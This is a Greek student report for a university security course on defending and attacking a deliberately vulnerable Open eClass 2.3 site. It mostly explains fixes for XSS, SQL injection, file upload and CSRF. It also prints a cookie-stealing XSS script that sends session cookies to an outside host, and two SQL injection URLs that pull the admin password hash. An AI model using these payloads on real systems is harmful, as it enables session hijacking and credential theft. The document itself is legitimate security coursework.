## Open eClass 2.3

Το repository αυτό περιέχει μια __παλιά και μη ασφαλή__ έκδοση του eclass.
Προορίζεται για χρήση στα πλαίσια του μαθήματος
[Προστασία & Ασφάλεια Υπολογιστικών Συστημάτων (ΥΣ13)](https://crypto.di.uoa.gr/csec/), __μην τη
χρησιμοποιήσετε για κάνενα άλλο σκοπό__.


## 2020 Project 1

Εκφώνηση: https://crypto.di.uoa.gr/csec/assets/projects/project1.pdf


### Προσωπικά στοιχεία

__Όνομα__:  Νικόλαος Γαλάνης | Εμμανουήλ Κάσδαγλης

__Α.Μ.__: 1115201700019      | 1115201700049

### Report - Γύρος 1: Defence

Κληθήκαμε να προστατεύσουμε μία παλία έκδοση του OpenEclass, η οποία είχε πολλά κενά ασφαλείας, και μπορούσε κάποιος να την σπάσει με κάθε μορφής επίθεση που αναφέρθηκε στο μάθημα. Επικεντρώσαμε την αναζήτηση για vunerabilities του site στις κατηγορίες των εξής επιθέσεων: __XSS attacks, SQL Injections, File Inclusions, Cross-site request forgery__. Τα αποτελέσματα της αναζήτησής μας, οι ενέργειές μας για να καλύψουμε τις ελείψεις, αλλά και οι ενέργεις για να επιτεθούμε στην αντίπαλη ομάδα παρουσιάζονται παρακάτω. Σημείωση: οι επιθέσεις, είναι όλες αυτές οι οποίες σχειδιάστηκαν. Αυτές που εφαρμόσαμε στο αντίπαλο site βρίσκονται σε επόμενη ενότητα του report.

### XSS
Οι xss επιθέσεις μπορούν να χρησιμοποιηθούν ώστε να εκτελεστεί κώδικας php __μέσα__ στο site του αντιπάλου, μέσω της εισαγωγής `<script>(...)</script>`

Στην πλατφόρμα του eclass βρέθηκαν πάρα πολλές τρύπες, καθώς με εξαίρεση ελάχιστα σημεία, το site ήταν εκτεθημένο σε xss attacks. Σε ελάχιστα σημεία (κυρίως σελίδες του διαχειριστή), είχε φτιαχτεί μία συνάρτηση q, η οποία ήταν συντομογραφία για την `htmlspecialchars()`, αλλά παρόλα αυτά, δεν χρησιμοποιούταν σχεδόν καθόλου.

#### Defence

Για να αντιμετωπιστούν αυτές οι ευπάθειες, προσπαθήσαμε να εφαρμόσουμε την συνάρτηση `htmlspecialchars()` σε όλες τις περιπτώσεις που υπάρχει user input, και όχι μόνο, __σε όλη την έκταση του eclass__, ακόμα και σε σελίδες του διαχειριστή. Το σκεπτικό μας ήταν πως ακόμα και αν ο αντίπαλος αποκτόυσε πρόσβαση σε περιεχόμενο τύπου admin, δεν θα έπρεπε να ήταν σε θέση να εκτελέσει επιθέσεις xss. Η εφαρμογή της άμυνάς μας, έγινε σε κάθε είδους φόρμες, πρίν την εισαγωγή των δεδομένων στην βάση, και για φόρμες που δεν αποθηκευόταν στην βάση(πχ συζητήσεις μαθήματος), τόσο στην ειδαγωγή των δεδομέων όσο και στην εκτύπωση(better safe than sorry).  Τα σημεία που βρέθηκαν ευπάθειες στο site ήταν:

    - (Μαθημα) -> Περιοχες Συζητησεων -> Νεο θέμα -> "html" επιλογή στον κειμενογράφο -> attack
    - (Μαθημα) -> Ανταλλαγή Αρχείων -> Ανέβασμα αρχείου με περιγραφή κάποιο script -> attack
    - (Μάθημα) -> Τηλεσυνεργασία -> Νεό μήνυμα με script -> Αποστολή -> Νέο μήνυμα με οτιναναι θέμα -> attack
    - Επεξεργασία Προφιλ -> Αλλαγή ονόματος / επιθέτου -> attack
    - (admin) -> Δημιουργία μαθήματος -> σε κάθε user input -> attack
    - (admin) -> Ανακοινωσεις μαθήματος -> σε κάθε user input -> attack
    - (admin) -> Διαχειριση χρηστών -> σε κάθε user input -> attack
    - Δημιουργία χρήστη -> username -> attack

Παρατηρήσαμε πως κάθε user input, για να εφανιστεί στην σελίδα, αποθηκευόταν στην μεταβλητή `tool_content`. Επομένως εστιάσαμε την προσοχή μας σε αυτή την μεταβλητή. Επίσης, όταν ο χρήστης καλούταν να συμπληρώσει κάποιου είδους φόρμα, φιλτράραμε τα δεδομένα πρίν αυτά εισαχθούν και αποθηλευτούν στην βάση δεδομένων.

Τέλος, τα άλλα modules του μαθήματος δεν είχαν κάποιο user input, και επομένως δεν χρειάζονταν κάποια παρέμβαση.

#### Attacks

Έχοντας εντοπίσει πληθώρα ευπαθειών στην σελίδα, έγινε προσπάθεια για εισαγωγή script σε κάθε μία απο αυτές τις σελίδες. Αρχικά δοκιμάζαμε την εκτέλεση του κλασσικού alert, για να δούμε αν η επίθεσή μας πετύχαινε. Η κύρια επιδίωξή μας μέσω των xss attacks ήταν να λάβουμε το cookie του αντίπαλου διαχειριστή. Αυτό, γίνεται μέσω του παρακάτω κώδικα.

```php

<script>
    image = new Image();
    image.src = `http://hack-n-roll.puppies.chatzi.org/cookie_stealer.php?cookie=` + document.cookie;
</script>  

```
Με το παραπάνω script, δημιουργούμε μία αίτηση απο την αντίπαλη σελίδα προς την δικιά μας, ενώ μας "πασάρεται" το cookie του του ενεργού session. Επομένως, αν καταφέρουμε να το "φυτρώσουμε" κάπου στο αντίπαλο σαιτ, τότε ο drunkadmin(ή οποιοδήποτε άλλος) συνδεθεί στην σελίδα, αυτόματα θα μας στέλνει το cookie του. Το cookie αυτό αποθηκεύεται σε ένα αρχείο μέσα στον server μας, στον φάκελο puppies. Το cookie_stealer.php υπάρχει στον φάκελο `report/xss` Έπειτα, είναι πολύ απλό να μπούμε στην αντίπαλη σελίδα, πηγαίνοντας απο το console του browser μας, και εκτελούμε την εντολή `document.cookie= "cookie_that_we_just_stole"` στην σελίδα των αντιπάλων μας. Με ένα refresh στην σελίδα, έχουμε συνδεθεί ώς ο χρήστης ο οποίος έκανε άθελά του την αίτηση.

### SQL

Τα sql injections μπορούν να χρησιμοποιηθοούν για να έχουμε πρόσβαση σε __δεδομένα που αποθηκεύονται στην βάση δεδομένων__, όπως ο κωδικός ενός χρήστη(κρυπτογραφημένος σε md5), καθώς και τα ονόματα secret directories που θα μας είναι χρήσιμα για RFI attacks. Δεν βρέθηκαν πολλά σημεία για SQL Injections στο site. Οι προγραμματισμές που το δημιούργησαν χρησιμοποίησαν τεχνικές έτσι ώστε να αποφήγουν είσοδο από τον χρήστη στα SQL Queries, ενώ σε σημεία που δεν μπορεί να αποφευχθεί υπάρχουν συναρτήσεις που καθορίζουν την μορφή των μεταβλητών πριν περάσουν απο τα queries. Ο κύριος τρόπος αντιμετώπισης των injections που παρατηρήσαμε ήταν οριμσένες συναρτήσεις escape, αλλά και χρήση της `intval()` όπου η είσοδος ήταν ακέραιος. Τα προβλήματα παρατηρήθηκαν σε σημεία που η SQL δέχεται είσοδο προσβάσιμη από τον χρήστη μέσω μεταβλητών που ορίζονται στα link.

#### Defence

Για την ασφάλεια του site επιλέχθηκε η τεχνική των prepared statements σε queries που η είσοδος μπόρει να καθοριστεί από κάποιον κακόβουλο χρήστη και δεν αφαιρέθηκαν. Τα αρχεία στα οποία βρίσκονται αυτά τα queries είναι:
 - modules/auth/opencourses.php
 - modules/auth/newuser.php
 - modules/auth/listfaculte.php
 - modules/work/work.php

Ενώ στο αρχείο modules/phpbb/viewtopic.php ασφαλίστηκε με την χρήση της συνάρτησης `intval()`.

#### Attack

Τα αξιοσημείωτα sql injections που βρέθηκαν έχουν σαν στόχο την εμφάνιση του κρυπτογραφημένου κωδικού του admin. Για να εκτελεστούν αρκούν τα παρακάτω, πρέπει εκ των πρωτέρων να είμαστα σε κάποιο μάθημα, και έπειτα να πάμε σε αυτά τα links:

 - modules/phpbb/viewtopic.php?topic=1 AND 0=1) UNION (SELECT 1,password FROM eclass.user WHERE username = "drunkadmin") -- &forum=1
 - modules/work/work.php?id=%27%20AND%200=1%20UNION%20SELECT%20password%20from%20eclass.user%20where%20username=%22drunkadmin%22%20--%20--

 Στην 1η περίπτωση, ο κωδικός εμφανίζεται σαν όνομα topic, ενώ στην 2η, η σελίδα εμφανίζει μήνυμα οτι η εργασία με τον κωδικό του διαχειριστή δεν υπάρχει. Δεν καταφέραμε να βρούμε κάποιο injection το οποίο να μας εμφανίζει το όνομα του `secret_directory`.

 

### File Injections

Οι RFI επιθέσεις μπορούν να χρησιμοποιηθούν ώστε ο απιτηθέμενος να καταφέρει να εκτελέσει κώδικα στο αντίπαλο site. Ο κώδικας αυτός, προέρχεται από τον ίδιο, μέσω αρχείων που έχει ανεβάσει στο domain. Στο eclass τα διαθέσιμα μέρη για ανέβασμα αρχείων ήταν οι __Εργασίες__ και η __Ανταλλαγή Αρχείων__. Κανένα απο αυτά τα 2 modules δεν ήταν καλά προστατευμένο απο File Injections, καθώς ο χρήστης μπορούσε ανενόχλητος να ανεβάσει ό,τι τύπου αρχείο ήθελε, και στην συνέχεια να το εκτελέσει, πηγαίνοντας στο link του αρχείου, στο οποίο εκ πρώτης όψεως δεν είχε πρόσβαση.

Όμως, μέσω του κώδικα στο αρχείο `modules/dropbox/dropbox_init1.inc.php`, είδαμε πως τα αρχεία της ανταλλαγής αρχείων βρίσκονται στον φάκελο `courses/<course_id>/dropbox/`, επομένως μέσα από εκεί θα μπορούσαμε να εκτελέσουμε το αρχείο το οποίο ανεβάσαμε, μέσα στον server. 

Αντίστοιχα, τα αρχεία που ανεβάζουν οι χρήστες για τις εργασίες, βρίσκονται στον κατάλογο `courses/<course_id>/work/`.

Και στις 2 περιπτώσεις, για "ασφάλεια", τα αρχεία και οι φάκελοι στα οποία μπαίνουν, παίρνουν τυχαίο όνομα, που όμως δεν έχει καμία σημασία, εφόσον μπορούμε να περιηγηθούμε στο δέντρο των καταλόγων του site. Επίσης, το όνομα αυτό αποθηκεύεται στην βάση δεδομένων, στο πεδίο secret_direcotry του πίνακα assignments, στο οποίο θα μπορούσαμε να αποκτήσουμε πρόσβαση με κάποιο sql injection.

Επίσης στο site μπορούν να γίνουν και Local file injections, αν ο αντίπαλος προσπαθήσει απο το url να κάνει include κάποιο αρχείο του server μας.

#### Defence

Για να αντιμετωπιστεί το πρόβλημα που αναφέρθηκε παραπάνω, κάναμε τα εξής:

 - Δημιουργήσαμε ένα αρχείο `.htaccess`, το οποίο απενεργοποιούσε την δυνατότητα να φαίνεται το δέντρο των καταλόγων, και επομένως, σε συνδυασμό με το ότι τα ονόματα των φακέλων είναι τυχαία, ο αντίπαλος δεν θα μπορούσε να βρεί την τοποθεσία των αρχείων που ανέβασε ώστε να τα τρέξει.
 - Φιλτράραμε το ανέβασμα των αρχείων, ώστε να μην επιτρέπεται να ανέβουν αρχεία με suspicious καταλήξεις, όπως `.php`, `.js`, `.sh` κλπ, ώστε ακόμα και αν με κάποιον τρόπο ο αντίπαλος αποκτούσε πρόσβαση στον φάκελο, να μην μπορούσε να τρέξει τα αρχεία.
 - Πραγματοποιήσαμε αλλαγές σε ονόματα κρίσιμων φακέλων, αρχείων και μεταβλητών ώστε στην περίπτωση που κάποιος κατάφερνε να έχει πρόσβαση, να μην καταφέρει να τις βρει.
 - Σκανάραμε το site για περιπτώσεις που σε include έμπαινε μεταβλητή που είχε εισάγει ο χρήστης, και αποτρέψαμε την εισαγωγή του "../", το οποίο πιθανώς να οδηγούσε σε φάκελο που δεν έπρεπε μέσα στο domain.

#### Attack

Εκμεταλλευόμενοι τις ευπάθειες της ιστοσελίδας, αλλά και τα μέρη στα οποία επιτρεπόταν το ανέβασμα αρχείων, δημιουργήσαμε μερικά scripts, με τα οποία προσπαθήσαμε να αποκτήσουμε πρόσβαση σε κωδικούς και να τους αλλάξουμε. Τα αρχεία αυτά βρίσκονται στον φάκελο `attacks/rfi/attacks/`, και επιτελούν τις εξής λειτουργίες:

 - `show_db_password.php`: Εφ'όσον γνωρίζουμε σε ποιό αρχείο αποθηκεύεται το username και ο κωδικός πρόσβασης στην βάση δεδομένων, προσπαθούμε να αποκτήσουμε πρόσβαση σε αυτό το αρχείο, και να εκτυπώσουμε τις μεταβλητές `$mysqlUser` και `$mysqlPassword`. 
 - `change_password.php`: Προσπαθούμε να εκτελέσουμε ένα query στην βάση, ώστε να αλλάξουμε τον κωδικό όλων των χρηστών. Γνωρίζοντας το όνομα της βάσης, όπως έχει οριστεί στο `config.php`, αποκτούμε εύκολα πρόσβαση σε αυτήν, και εκτελούμε την ενημέρωση που θέλουμε στην βάση.
 - `upload_index.php`: Διαγράφει το αρχείο index.php, και το αντικαθιστά με ένα της επιλογής μας.
  
### CSRF

Οι επιθέσεις CSRF μπορούν να είναι χρήσιμες για τον αντίπαλο, αν κάποιος χρήστης συνδεδεμένος στο site, κάνει κλικ σε ένα link το οποίο να αντιστοιχεί σε σελίδα η οποία συμπληρώνει μία ψεύτικη φόρμα που επιφέρει αλλαγές που κανονικά θα έπρεπε να έχει αιτηθεί το site. Η σελίδα του eclass δεν είχε __απολύτως καμία__ προστασία ενάντια σε επιθέσεις CSRF.

#### Defence

Αποφασίσαμε σε κάθε φόρμα να αμυνθούμε με την τεχνική των __CSRF tokens__. Στο index.php, στο οποίο μπαίνει ο χρήστης με το που συνδέεται στο eclass, δημιουργούμε μία global μεταβλητή που κρατάει ένα randomly generated token, συγκεκριμένα στην μεταβλητή `$_SESSION['token']`. Έπειτα, κάθε φορά που δημιουργείται μία νέα φόρμα για κάποια λειτουργία του eclass(συνήθως γίνεται append στην μεταβλητή `$toolContent`), προσθέτουμε σαν κρυφό πεδίο μία μεταβλητή `form_token`, οπου παίρνει την τιμή του token που προηγουμένως έχει γίνει generate. Τέλος, όταν η εκάστοτε σελίδα επεξεργάζεται την φόρμα που έχει λάβει, καλεί την συνάρτηση `check_token()`, και εκτελεί την ενέργεια υπό την προυπόθεση οτι αυτή η συνάρτηση επιστρέφει True. Η συνάρτηση αυτή, είναι υλοποιημένη στο αρχείο `include/lib/main.lib.php`, μαζί με άλλες συναρτήσεις για λόγους ασφαλείας, και ελέγχει αν υπάρχει token στην φόρμα, και αν η τιμή του token της φόρμας είναι ίση με την μεταβλητή `$_SESSION['token']`. 

Ένα άλλο μέτρο που πήραμε για να ασφαλήσουμε την εφαρμοη μας απο CSRF επιθέσεις ήταν __να αλλάξουμε το όνομα του φακέλου στο οποίο βρίσκεται το περιεχόμενο του διαχειριστή__, απο admin σε eclass_admin. Γνωρίζουμε πως οι αντίπαλοι είχαν εκ των πρωτέρων εμπειρία για το που βρίσκονται τα links για σελίδες με φόρμες(τα οποία είναι κυρίως σε σελίδες διαχεριστή). Επομένως, με το να αλλάξουμε το όνομα του φακέλου, το οποίο δεν μπορεί να γίνει γνωστό σε αυτούς καθώς έχουν regular χρήστη που δεν έχει πρόσβαση σε περιεχόμενο admin, αχρηστεύουμε όλα τα forms τα οποία θα απευθύνουν προς σελίδες προς κάποιο αρχείο στον φάκελο admin, καθώς απλά πετάει 404 στον deunkadmin όταν κάνει κλικ σε μία τέτοια φόρμα.

#### Attack

Για να επιτεθούμε με επιθέσεις CSRF, έπρεπε να βρούμε όλα τα σημεία τα οποία περιέχουν φόρμες στην ιστοσελίδα του eclass. Τα αρχεία αυτά είναι τα παρακάτω:

 - modules/admin/edituser.php  -- done
 - modules/admin/newuseradmin.php -- defence(done)
 - modules/admin/change_user.php -- done
 - modules/admin/addfaculte.php -- done
 - modules/admin/adminannouncements.php  -- defence(done)
 - modules/admin/eclassconf.php  -- done
 - modules/create_course/create_course.php --defence(done)
 - modules/profile/profile.php -- done
 - modules/profile/password.php (?) --defence(done)
 - modules/announcements/announcements.php  -- defence(done)
 - modules/work/work.php --defence(done)
 - modules/dropbox/index.php --defence(done)
 - modules/phpbb/newtopic.php --defence(done)
 - modules/course_info/infocours.php -- defence(done)

Για τα περισσότερα από αυτά, δημιουργήσαμε μία φόρμα με action το domain των αντιπάλων μας. Επίσης, η φόρμα αυτή μπορεί να προσαρμοστεί ως εξής: Αν περιηγηθούμε με τα developer tools στο site των αντιπάλων μας, μπορούμε να δούμε τα responses μιας σελίδας με φόρμα, ώστε να δούμε αν υπάρχει κάποιο token που έχουν βάλει οι αντίπαλοί μας, και να δούμε κατα πόσον αυτό ειναι στατικό. Όλες οι φόρμες που δημιουργήσαμε βρίσκονται στο domain `hack-n-roll.puppies.chatzi.org` και αποστάλθηκαν με mail στον drunkadmin. Σε αυτές τις φόρμες, προσθέτουμε και επιθέσεις XSS, καθώς αν καταφέρουμε να εκτελέσουμε την φόρμα, τότε πιθανώς οι σελίδες αυτές θα είναι και απροστάτευτες από xss επιθέσεις.

### Γενικές τεχνικές άμυνας


Επίσης, γνωρίζαμε πως οι αντίπαλοι είχαν ήδη δει τον κώδικα της ιστοσελίδας, και επομένως τους ήταν πολύ εύκολο να γνωρίζουν ονόματα φακέλων, αρχείων και μεταβλητών. Για αυτόν τον λόγο κάναμε μερικές περεταίρω αλλαγές, ώστε να αποκρύψουμε μερικά πράγματα, στα πλαίσια που δεν άλλαζε η λειτουργικότητα της σελίδας. Επιπλέον, κάναμε μερικές παραδοχές, σύμφωνα με αυτά που είχαν συζητηθεί και στο piazza. Οι περεταίρω ενέργειές μας είναι οι εξής:

  - __Αλλάξαμε το όνομα του directory που αναφέρεται σε λειτουρργίες διαχειριστή__. Κανονικά, ο αντίπαλος δεν πρέπει ποτέ να αποκτήσει πρόσβαση σε περιεχόμενο του καταλόγου admin. Για να είμαστε σίγουροι όμως οτι δεν υπάρχει κάποιο περιθώριο να πάρει δεδομένα "μαντεύοντας" ένα link σε αυτόν τον φάκελο, τον μετονομάσαμε, ώστε οποιοδήποτε link και αν περιείχε στο path τον φάκελο admin να επέστρεφε 404.
  - __Διαγράψαμε τους φακέλους και τα αρχεία που αναφέρονταν σε λειτουργίες που δεν χρειαζόταν να είναι ενεργοποιημένες__. Στην εκφώνηση αναφέρονταν οι λειτουργίες οι οποίες έπρεπε να είναι ενεργές για το μάθημα που έχει δημιουργηθεί. Οι υπόλοιπες, σε συνδυασμό με αυτές που δεν είναι απαραίτητες για την λειτουργία του eclass(αναζήτηση, στατιστικά κλπ) αφαιρέθηκαν διαγράφοντας τα αρχεία. Έτσι, ακόμα και αν κάποιος αποκτούσε πρόσβαση ώς καθηγητής στο site μας, δεν θα μπορούσε να ενεργοποιήσει τις υπόλοιπες (απροστάτευτες) λειτουργίες.
  - __Αλλάξαμε το όνομα της μεταβλητής mysqlpassword στο αρχείο config__. Ένας άλλος τρόπος στον οποίον βασίστηκαν μερικές από τις επιθέσεις μας, ήταν να μάθουμε την τιμή αυτής της μεταβλητής, η οποία περιέχει σαν plain text τον κωδικό του διαχειριστή της βάσης (ο οποίος στο αντίπαλο site πιθανώς να είναι ίδιος και με του drunkadmin). Επομένως αλλάξαμε το όνομα αυτής της μεταβλητής, ώστε ακόμα και αν ο αντίπαλος αποκτούσε πρόσβαση στο αρχείο config, να μην μπορούσε να εμφανίσει την μεταβλητή με το αρχίκο της όνομα. Ακόμη, την τοποθετήσαμε σε ένα άλλο αρχείο το οποίο γίνεται include απο το `config.php`, ώστε αν το config έρθει στα χέρια του αντιπάλου μας, να μην μπορεί να δει την τιμή της μεταβλητής.

### Report - Γύρος 2: Attack